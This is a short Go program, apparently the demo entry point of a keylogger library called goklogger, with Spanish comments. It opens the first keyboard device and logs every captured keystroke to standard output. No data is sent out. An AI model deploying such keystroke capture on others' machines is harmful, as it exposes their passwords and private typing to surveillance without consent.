package main

/*
#include <stdio.h>
#include <unistd.h>
static inline leave_buffer_clean() {
	setvbuf(stdout, NULL, _IONBF, 0);
}
*/
import "C"

import (
	"log"

	"github.com/ljesparis/goklogger/pkg"
)

func main() {
	// vamos a evitar que el buffer de la
	// salida estandar se llene.
	C.leave_buffer_clean()

	// abriendo el primer teclado que encuentre
	dev, err := pkg.OpenKeyboardDevice()
	if err != nil {
		log.Panicln(err)
	}

	defer func() {
		// cerrando el teclado.
		log.Println("Closing device")
		log.Println("Device Closed: ", dev.Close())
	}()

	log.Println("Device Name: ", dev.Name)
	log.Println("Device Path: ", dev.Path, "\n")

	// empezar a leer los datos de la entrada
	// del teclado
	var buff string
	dev.StartReadingInput(func(c string, err error) {
		buff += c
		if err != nil && len(buff) >= 1 {
			log.Print(buff)
			buff = ""
		}
	})
}
